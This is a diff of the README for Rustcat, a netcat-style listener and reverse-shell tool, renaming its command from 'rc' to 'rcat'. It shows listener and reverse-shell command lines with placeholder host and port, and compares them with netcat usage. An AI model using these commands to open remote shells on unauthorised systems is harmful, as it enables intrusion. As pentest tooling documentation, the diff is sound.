@@ -58,16 +58,16 @@
 ## 👶 Everything Easy
 ![Ex](https://raw.githubusercontent.com/robiot/rustcat/main/img/easy-revshell.gif)
 
-Starting a listener is just as simple as `rc -lp port`. While in netcat you would do something like `nc -nlvp port` to get the same results.
+Starting a listener is just as simple as `rcat -lp port`. While in netcat you would do something like `nc -nlvp port` to get the same results.
 
-And creating a reverse shell has never been easier, `rc host port -r shell` is all you need. No more long /dev/tcp stuff that you always forget.
+And creating a reverse shell has never been easier, `rcat host port -r shell` is all you need. No more long /dev/tcp stuff that you always forget.
 
 ## 📃 Command History
 ![Ex](https://raw.githubusercontent.com/robiot/rustcat/main/img/history.gif)
 
 Command history is something we all need. How annoying isn't it when you accidently type a long command wrong, then you have to rewrite the entire thing.
 
-But Rustcat fixes that with command history. Just add -H and you will get command history (`rc -lHp port`) and command completion, unlike netcat where you have to use another application and do `rlwrap -cAr nc -nlvp port` to get the same results.
+But Rustcat fixes that with command history. Just add -H and you will get command history (`rcat -lHp port`) and command completion, unlike netcat where you have to use another application and do `rlwrap -cAr nc -nlvp port` to get the same results.
 
 When adding -H, the shell will almost work like a ssh shell.
 
